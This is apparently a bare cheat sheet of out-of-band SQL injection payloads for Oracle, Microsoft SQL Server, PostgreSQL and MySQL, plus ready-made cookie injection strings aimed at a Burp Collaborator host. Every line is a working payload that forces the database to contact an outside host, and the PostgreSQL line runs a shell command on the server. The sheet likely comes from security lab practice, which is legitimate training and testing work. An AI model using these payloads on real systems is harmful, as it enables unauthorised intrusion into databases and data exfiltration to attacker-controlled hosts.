// Oracle
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') 

// Microsoft
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' 

// PostgreSql
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' 

// Mysql
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' 

w30oltv5s0z7cg63u7ly9snopfv6jy7n.oastify.com

TrackingId=UGb4X7Ro9ExswzYn'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//w30oltv5s0z7cg63u7ly9snopfv6jy7n.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--